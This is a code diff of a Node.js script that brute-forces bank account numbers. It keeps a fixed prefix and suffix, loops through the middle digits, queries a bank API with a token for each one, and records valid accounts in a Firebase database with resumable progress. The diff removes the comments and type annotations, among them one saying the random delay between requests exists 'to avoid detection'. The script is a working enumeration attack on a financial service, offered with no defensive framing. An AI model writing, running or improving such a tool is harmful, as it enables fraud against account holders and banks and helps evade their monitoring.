@@ -4,31 +4,25 @@ import admin from 'firebase-admin';
 import chalk from 'chalk';
 import prettyMs from 'pretty-ms';
 
-// Load Firebase service account key from environment variable
 const serviceAccount = JSON.parse(process.env.FIREBASE_KEY_JSON);
 
-// Initialize Firebase Admin SDK
 admin.initializeApp({
   credential: admin.credential.cert(serviceAccount),
   databaseURL: 'https://a-b-c-s-default-rtdb.firebaseio.com',
 });
 
-// Firebase references
 const db = admin.database();
 const attemptsRef = db.ref('Attempt');
 const validRef = db.ref('Valid Account');
 const controlRef = db.ref('control');
 
-// ENV Variables
 const BANK_CODE = process.env.BANK_CODE;
 const API_URL = process.env.API_URL;
 const TOKEN = process.env.API_TOKEN;
 
-// Fixed values
 const FIRST3 = '217';
 const LAST3 = '281';
 
-// Restore last attempt
 let start = 0;
 if (fs.existsSync('state.json')) {
   const state = JSON.parse(fs.readFileSync('state.json', 'utf8'));
@@ -40,16 +34,15 @@ controlRef.child('status').on('value', (snap) => {
   stop = snap.val() === 'stop';
 });
 
-// Helpers
-function sleep(ms: number) {
+function sleep(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-function saveState(i: number) {
+function saveState(i) {
   fs.writeFileSync('state.json', JSON.stringify({ last: i }), 'utf8');
 }
 
-async function isAlreadyValidated(accountNumber: string): Promise<boolean> {
+async function isAlreadyValidated(accountNumber) {
   const snapshot = await validRef.orderByChild('accountNumber').equalTo(accountNumber).once('value');
   return snapshot.exists();
 }
@@ -69,7 +62,6 @@ async function bruteForce() {
     const accountNumber = `${FIRST3}${middle}${LAST3}`;
     const timestamp = new Date().toISOString();
 
-    // Skip if already validated
     if (await isAlreadyValidated(accountNumber)) {
       console.log(chalk.cyan(`[SKIPPED] ${accountNumber} already validated.`));
       continue;
@@ -97,7 +89,7 @@ async function bruteForce() {
 
         break;
 
-      } catch (err: any) {
+      } catch (err) {
         retryCount++;
         const status = err.response?.status;
 
@@ -116,10 +108,8 @@ async function bruteForce() {
       }
     }
 
-    // Add slight random delay to avoid detection
-    await sleep(400 + Math.floor(Math.random() * 200)); // 400ms – 600ms
+    await sleep(400 + Math.floor(Math.random() * 200));
 
-    // Save progress every 20 checks
     if (i % 20 === 0) saveState(i);
   }
 
@@ -127,5 +117,4 @@ async function bruteForce() {
   console.log(chalk.blue(`\n🎉 Finished in ${prettyMs(duration)}`));
 }
 
-// Start it
 bruteForce();
